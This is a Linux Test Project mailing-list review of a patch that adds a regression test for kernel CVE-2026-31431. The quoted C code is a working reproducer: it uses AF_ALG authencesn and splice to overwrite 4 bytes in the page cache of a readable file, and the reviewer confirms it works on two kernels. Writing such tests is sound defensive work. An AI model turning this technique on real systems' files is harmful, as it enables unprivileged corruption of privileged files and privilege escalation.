Return-Path: <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>
X-Spam-Checker-Version: SpamAssassin 3.4.0 (2014-02-07) on
	aws-us-west-2-korg-lkml-1.web.codeaurora.org
Received: from picard.linux.it (picard.linux.it [213.254.12.146])
	(using TLSv1.2 with cipher ECDHE-RSA-AES256-GCM-SHA384 (256/256 bits))
	(No client certificate requested)
	by smtp.lore.kernel.org (Postfix) with ESMTPS id 2AA7ACD13D2
	for <ltp@archiver.kernel.org>; Thu, 30 Apr 2026 12:15:28 +0000 (UTC)
Received: from picard.linux.it (localhost [IPv6:::1])
	by picard.linux.it (Postfix) with ESMTP id BDDCD3E65A7
	for <ltp@archiver.kernel.org>; Thu, 30 Apr 2026 14:15:26 +0200 (CEST)
Received: from in-3.smtp.seeweb.it (in-3.smtp.seeweb.it
 [IPv6:2001:4b78:1:20::3])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature ECDSA (secp384r1))
 (No client certificate requested)
 by picard.linux.it (Postfix) with ESMTPS id 449C23CBDB2
 for <ltp@lists.linux.it>; Thu, 30 Apr 2026 14:15:08 +0200 (CEST)
Received: from smtp-out1.suse.de (smtp-out1.suse.de [195.135.223.130])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (2048 bits) server-digest SHA256)
 (No client certificate requested)
 by in-3.smtp.seeweb.it (Postfix) with ESMTPS id 872B91A00F11
 for <ltp@lists.linux.it>; Thu, 30 Apr 2026 14:15:07 +0200 (CEST)
Received: from imap1.dmz-prg2.suse.org (unknown [10.150.64.97])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by smtp-out1.suse.de (Postfix) with ESMTPS id 0C2066A803;
 Thu, 30 Apr 2026 12:15:06 +0000 (UTC)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1777551306; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=QpYVFrTBZlwsf8Oml7gbvEMOnKl47l0PK+hRNBLhJOo=;
 b=Is+WHHCBU5xJcHdSSwlIqe/V1Hom9je9zhgjdkIJiUh9dyqCETgd8RaIZRji75KNH2xTGp
 YpajsRtVAZ+ziMwnMk6Ajypl3n6JAeAztHdHKGSdCrBsDqoxzpaZv4/vc6fNO6u6TQMyvC
 7Dua5jh59w5VQUzrfI7nmfT6OY6F86w=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1777551306;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=QpYVFrTBZlwsf8Oml7gbvEMOnKl47l0PK+hRNBLhJOo=;
 b=8CAPzcm/avVHbMmNY9tdL2lxq2Wic5TjGrnxzbNobJaNt3fpn+KJQO/jY6HkqJO5QtvM4o
 IeOzKb/T+AFvmRAg==
Authentication-Results: smtp-out1.suse.de;
	none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=suse.cz; s=susede2_rsa;
 t=1777551306; h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=QpYVFrTBZlwsf8Oml7gbvEMOnKl47l0PK+hRNBLhJOo=;
 b=Is+WHHCBU5xJcHdSSwlIqe/V1Hom9je9zhgjdkIJiUh9dyqCETgd8RaIZRji75KNH2xTGp
 YpajsRtVAZ+ziMwnMk6Ajypl3n6JAeAztHdHKGSdCrBsDqoxzpaZv4/vc6fNO6u6TQMyvC
 7Dua5jh59w5VQUzrfI7nmfT6OY6F86w=
DKIM-Signature: v=1; a=ed25519-sha256; c=relaxed/relaxed; d=suse.cz;
 s=susede2_ed25519; t=1777551306;
 h=from:from:reply-to:date:date:message-id:message-id:to:to:cc:
 mime-version:mime-version:content-type:content-type:
 content-transfer-encoding:content-transfer-encoding:
 in-reply-to:in-reply-to:references:references:autocrypt:autocrypt;
 bh=QpYVFrTBZlwsf8Oml7gbvEMOnKl47l0PK+hRNBLhJOo=;
 b=8CAPzcm/avVHbMmNY9tdL2lxq2Wic5TjGrnxzbNobJaNt3fpn+KJQO/jY6HkqJO5QtvM4o
 IeOzKb/T+AFvmRAg==
Received: from imap1.dmz-prg2.suse.org (localhost [127.0.0.1])
 (using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 key-exchange X25519 server-signature RSA-PSS (4096 bits) server-digest SHA256)
 (No client certificate requested)
 by imap1.dmz-prg2.suse.org (Postfix) with ESMTPS id 02E5C593B0;
 Thu, 30 Apr 2026 12:15:06 +0000 (UTC)
Received: from dovecot-director2.suse.de ([2a07:de40:b281:106:10:150:64:167])
 by imap1.dmz-prg2.suse.org with ESMTPSA id C+9yAMpH82k4awAAD6G6ig
 (envelope-from <mdoucha@suse.cz>); Thu, 30 Apr 2026 12:15:06 +0000
Message-ID: <b4204a62-890a-44fb-89b5-70d739fc7e64@suse.cz>
Date: Thu, 30 Apr 2026 14:15:01 +0200
MIME-Version: 1.0
User-Agent: Mozilla Thunderbird
To: Andrea Cervesato <andrea.cervesato@suse.de>,
 Linux Test Project <ltp@lists.linux.it>
References: <20260430-cve-2026-31431-v1-1-7fdc16c25785@suse.com>
Content-Language: en-US
From: Martin Doucha <mdoucha@suse.cz>
Autocrypt: addr=mdoucha@suse.cz; keydata=
 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 ag==
In-Reply-To: <20260430-cve-2026-31431-v1-1-7fdc16c25785@suse.com>
X-Spamd-Result: default: False [-8.30 / 50.00]; REPLY(-4.00)[];
 BAYES_HAM(-3.00)[100.00%]; NEURAL_HAM_LONG(-1.00)[-1.000];
 NEURAL_HAM_SHORT(-0.20)[-1.000]; MIME_GOOD(-0.10)[text/plain];
 TO_DN_ALL(0.00)[]; ARC_NA(0.00)[];
 DKIM_SIGNED(0.00)[suse.cz:s=susede2_rsa,suse.cz:s=susede2_ed25519];
 FUZZY_RATELIMITED(0.00)[rspamd.com];
 TO_MATCH_ENVRCPT_ALL(0.00)[]; RCPT_COUNT_TWO(0.00)[2];
 FROM_HAS_DN(0.00)[]; RCVD_TLS_ALL(0.00)[];
 FROM_EQ_ENVFROM(0.00)[]; MIME_TRACE(0.00)[0:+];
 RCVD_COUNT_TWO(0.00)[2]; RCVD_VIA_SMTP_AUTH(0.00)[];
 MID_RHS_MATCH_FROM(0.00)[];
 DBL_BLOCKED_OPENRESOLVER(0.00)[imap1.dmz-prg2.suse.org:helo, suse.com:email,
 suse.cz:mid, suse.cz:email]
X-Virus-Scanned: clamav-milter 1.0.9 at in-3.smtp.seeweb.it
X-Virus-Status: Clean
Subject: Re: [LTP] [PATCH] cve-2026-31431: Add page cache corruption
 reproducer
X-BeenThere: ltp@lists.linux.it
X-Mailman-Version: 2.1.29
Precedence: list
List-Id: Linux Test Project <ltp.lists.linux.it>
List-Unsubscribe: <https://lists.linux.it/options/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=unsubscribe>
List-Archive: <http://lists.linux.it/pipermail/ltp/>
List-Post: <mailto:ltp@lists.linux.it>
List-Help: <mailto:ltp-request@lists.linux.it?subject=help>
List-Subscribe: <https://lists.linux.it/listinfo/ltp>,
 <mailto:ltp-request@lists.linux.it?subject=subscribe>
Content-Transfer-Encoding: 7bit
Content-Type: text/plain; charset="us-ascii"; Format="flowed"
Errors-To: ltp-bounces+ltp=archiver.kernel.org@lists.linux.it
Sender: "ltp" <ltp-bounces+ltp=archiver.kernel.org@lists.linux.it>

Hi,
nice work. I've tested the reproducer on kernels v4.12 and v6.12 and I 
can confirm that it works. I have a few ideas for further improvement below.

First of all, I'd recommend moving the test to 
testcases/kernel/crypto/af_alg08.c and adding it to the crypto runfile 
as well.

On 4/30/26 12:17, Andrea Cervesato wrote:
> From: Andrea Cervesato <andrea.cervesato@suse.com>
> 
> A logic bug in authencesn allows an unprivileged user to corrupt
> 4 bytes of page cache via AF_ALG + splice. The test writes known
> data to a file, attempts corruption through the AEAD scratch-write
> path, and verifies whether the file content was modified.
> 
> Signed-off-by: Andrea Cervesato <andrea.cervesato@suse.com>
> ---
>   runtest/cve                    |   1 +
>   testcases/cve/.gitignore       |   1 +
>   testcases/cve/cve-2026-31431.c | 172 +++++++++++++++++++++++++++++++++++++++++
>   3 files changed, 174 insertions(+)
> 
> diff --git a/runtest/cve b/runtest/cve
> index c3ecd74dd9f837924b810b7b431ebb911d809966..499cbb3bc4170453560c329133e2c52b5a3b8c5c 100644
> --- a/runtest/cve
> +++ b/runtest/cve
> @@ -93,3 +93,4 @@ cve-2022-0185 fsconfig03
>   cve-2022-4378 cve-2022-4378
>   cve-2025-38236 cve-2025-38236
>   cve-2025-21756 cve-2025-21756
> +cve-2026-31431 cve-2026-31431
> diff --git a/testcases/cve/.gitignore b/testcases/cve/.gitignore
> index dc1dad5b0d0d02a3ab57e72516c33ee7949c8431..f8e2b7a7d0a6c0c32f8908ae9974ead6a57f358b 100644
> --- a/testcases/cve/.gitignore
> +++ b/testcases/cve/.gitignore
> @@ -15,3 +15,4 @@ icmp_rate_limit01
>   tcindex01
>   cve-2025-38236
>   cve-2025-21756
> +cve-2026-31431
> diff --git a/testcases/cve/cve-2026-31431.c b/testcases/cve/cve-2026-31431.c
> new file mode 100644
> index 0000000000000000000000000000000000000000..b762096c1ecb940267ab2a337130939763f75452
> --- /dev/null
> +++ b/testcases/cve/cve-2026-31431.c
> @@ -0,0 +1,172 @@
> +// SPDX-License-Identifier: GPL-2.0-or-later
> +/*
> + * Copyright (C) 2026 SUSE LLC Andrea Cervesato <andrea.cervesato@suse.com>
> + */
> +
> +/*\
> + * Test for CVE-2026-31431 ("Copy Fail") fixed in kernel v7.0:
> + * a664bf3d603d ("crypto: algif_aead - Separate src from dst")
> + *
> + * A logic bug in authencesn, the kernel's AEAD wrapper for IPsec Extended
> + * Sequence Numbers, allows an unprivileged user to write 4 controlled bytes
> + * into the page cache of any readable file. During AEAD decryption,
> + * authencesn uses the destination scatterlist as scratch space for ESN byte
> + * rearrangement. When data is spliced from a file into an AF_ALG socket, the
> + * 2017 in-place optimization (72548b093ee3) places page cache pages into the
> + * writable destination scatterlist. authencesn's scratch write then corrupts
> + * those pages.
> + *
> + * The test creates a file with known data, attempts page cache corruption via
> + * the AF_ALG + splice technique, and verifies whether the file content was
> + * modified.
> + *
> + * Reproducer based on:
> + * https://github.com/theori-io/copy-fail-CVE-2026-31431
> + */
> +
> +#include "tst_test.h"
> +#include "tst_af_alg.h"
> +#include "lapi/socket.h"
> +#include "lapi/splice.h"
> +
> +#define TESTFILE "copy_fail"
> +#define OVERWRITE_SIZE 4
> +#define AEAD_AUTHSIZE 4
> +#define AEAD_ASSOCLEN 8
> +#define AES_IV_SIZE 16
> +#define SPI_SIZE 4
> +
> +static const uint8_t original[OVERWRITE_SIZE] = { 'X', 'X', 'X', 'X' };
> +static const uint8_t payload[OVERWRITE_SIZE] = { 'P', 'W', 'N', 'D' };
> +
> +/*
> + * authenc key format: struct rtattr header (8 bytes) +
> + * HMAC-SHA256 key (16 bytes) + AES-128 key (16 bytes)
> + */
> +static const uint8_t authenc_key[] = {
> +	0x08, 0x00, 0x01, 0x00,
> +	0x00, 0x00, 0x00, 0x10,
> +	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> +	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> +	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> +	0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
> +};
> +
> +static void try_corrupt(int fd)
> +{
> +	int algfd, reqfd, pipefd[2];
> +	loff_t off_in = 0;
> +	uint8_t aad[AEAD_ASSOCLEN];
> +	uint8_t iv[AES_IV_SIZE] = { 0 };
> +	struct af_alg_iv *alg_iv;
> +	struct cmsghdr *cmsg;
> +	char recvbuf[AEAD_ASSOCLEN];
> +
> +	/* AAD[0..3] = SPI (don't care), AAD[4..7] = ESN scratch-write zone */
> +	memset(aad, 'A', SPI_SIZE);
> +	memcpy(aad + SPI_SIZE, payload, OVERWRITE_SIZE);
> +
> +	algfd = tst_alg_setup("aead", "authencesn(hmac(sha256),cbc(aes))",
> +			      authenc_key, sizeof(authenc_key));
> +	SAFE_SETSOCKOPT(algfd, SOL_ALG, ALG_SET_AEAD_AUTHSIZE, NULL,
> +			AEAD_AUTHSIZE);
> +
> +	reqfd = tst_alg_accept(algfd);
> +
> +	struct iovec iov = {
> +		.iov_base = aad,
> +		.iov_len = sizeof(aad),
> +	};
> +
> +	uint8_t cbuf[CMSG_SPACE(sizeof(uint32_t)) +
> +		     CMSG_SPACE(sizeof(struct af_alg_iv) + AES_IV_SIZE) +
> +		     CMSG_SPACE(sizeof(uint32_t))];
> +
> +	memset(cbuf, 0, sizeof(cbuf));
> +
> +	struct msghdr msg = {
> +		.msg_iov = &iov,
> +		.msg_iovlen = 1,
> +		.msg_control = cbuf,
> +		.msg_controllen = sizeof(cbuf),
> +	};
> +
> +	cmsg = CMSG_FIRSTHDR(&msg);
> +	cmsg->cmsg_level = SOL_ALG;
> +	cmsg->cmsg_type = ALG_SET_OP;
> +	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
> +	*(uint32_t *)CMSG_DATA(cmsg) = ALG_OP_DECRYPT;
> +
> +	cmsg = CMSG_NXTHDR(&msg, cmsg);
> +	cmsg->cmsg_level = SOL_ALG;
> +	cmsg->cmsg_type = ALG_SET_IV;
> +	cmsg->cmsg_len = CMSG_LEN(sizeof(struct af_alg_iv) + AES_IV_SIZE);
> +	alg_iv = (struct af_alg_iv *)CMSG_DATA(cmsg);
> +	alg_iv->ivlen = AES_IV_SIZE;
> +	memcpy(alg_iv->iv, iv, AES_IV_SIZE);
> +
> +	cmsg = CMSG_NXTHDR(&msg, cmsg);
> +	cmsg->cmsg_level = SOL_ALG;
> +	cmsg->cmsg_type = ALG_SET_AEAD_ASSOCLEN;
> +	cmsg->cmsg_len = CMSG_LEN(sizeof(uint32_t));
> +	*(uint32_t *)CMSG_DATA(cmsg) = AEAD_ASSOCLEN;
> +
> +	SAFE_SENDMSG(sizeof(aad), reqfd, &msg, MSG_MORE);

The entire setup between tst_alg_accept() and here could be replaced 
with a single call to tst_alg_sendmsg() + filling out the simple params 
structure. But you'll have to add a new parameter for sendmsg() flags so 
that you can pass MSG_MORE. The function is currently called only from 
af_alg02.

> +
> +	SAFE_PIPE(pipefd);
> +
> +	TEST(splice(fd, &off_in, pipefd[1], NULL, OVERWRITE_SIZE, 0));
> +	if (TST_RET < 0)
> +		tst_brk(TBROK | TTERRNO, "splice(file -> pipe)");
> +
> +	TEST(splice(pipefd[0], NULL, reqfd, NULL, OVERWRITE_SIZE, 0));
> +	if (TST_RET < 0)
> +		tst_brk(TBROK | TTERRNO, "splice(pipe -> AF_ALG)");
> +
> +	/* Expected to fail (invalid ciphertext); triggers the scratch write */
> +	TST_EXP_FAIL_SILENT(recv(reqfd, recvbuf, sizeof(recvbuf), 0), EBADMSG);
> +
> +	SAFE_CLOSE(pipefd[0]);
> +	SAFE_CLOSE(pipefd[1]);
> +	SAFE_CLOSE(reqfd);
> +	SAFE_CLOSE(algfd);

It'd be better to make the file descriptor variables global and close 
them also in cleanup(), in case one of the safe commands fails.

> +}
> +
> +static void run(void)
> +{
> +	int file_fd;
> +	uint8_t readback[OVERWRITE_SIZE];
> +
> +	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
> +	try_corrupt(file_fd);
> +	SAFE_CLOSE(file_fd);
> +
> +	file_fd = SAFE_OPEN(TESTFILE, O_RDONLY);
> +	SAFE_READ(1, file_fd, readback, sizeof(readback));
> +	SAFE_CLOSE(file_fd);
> +
> +	if (memcmp(readback, original, OVERWRITE_SIZE) != 0)
> +		tst_res(TFAIL, "Page cache was corrupted via AF_ALG splice");
> +	else
> +		tst_res(TPASS, "Page cache was not corrupted");
> +}
> +
> +static void setup(void)
> +{
> +	int fd;
> +
> +	fd = SAFE_OPEN(TESTFILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);

Creating the file with access mode 0444 (read-only) would be even better.

> +	SAFE_WRITE(SAFE_WRITE_ALL, fd, original, OVERWRITE_SIZE);
> +	SAFE_CLOSE(fd);
> +}
> +
> +static struct tst_test test = {
> +	.test_all = run,
> +	.setup = setup,
> +	.needs_tmpdir = 1,
> +	.tags = (const struct tst_tag[]) {
> +		{"linux-git", "a664bf3d603d"},
> +		{"CVE", "2026-31431"},
> +		{}
> +	},
> +};
> 
> ---
> base-commit: 69b8169310425b8c5abd01d3fdb46f6d939e8a66
> change-id: 20260430-cve-2026-31431-eda4297d56bc
> 
> Best regards,


-- 
Martin Doucha   mdoucha@suse.cz
SW Quality Engineer
SUSE LINUX, s.r.o.
CORSO IIa
Krizikova 148/34
186 00 Prague 8
Czech Republic

-- 
Mailing list info: https://lists.linux.it/listinfo/ltp
